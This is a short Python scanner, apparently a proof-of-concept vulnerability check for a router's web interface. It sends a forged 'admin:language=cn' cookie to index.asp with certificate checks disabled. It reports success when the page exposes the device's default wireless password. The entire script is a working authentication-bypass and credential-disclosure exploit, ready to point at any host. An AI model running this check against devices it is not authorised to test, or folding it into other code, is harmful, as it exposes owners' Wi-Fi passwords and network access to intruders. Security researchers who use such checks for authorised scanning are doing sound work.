import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"index.asp"
	headers={'cookie': 'admin:language=cn'}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and re.search("def_wirelesspassword = \"[0-9A-Za-z]{8,}\"",response.text) and "\"wirelesspassword\",59, def_wirelesspassword" in response.text:
		r1=True
	else:
		r1=False
	if r1:
		return True
	else:
		return False
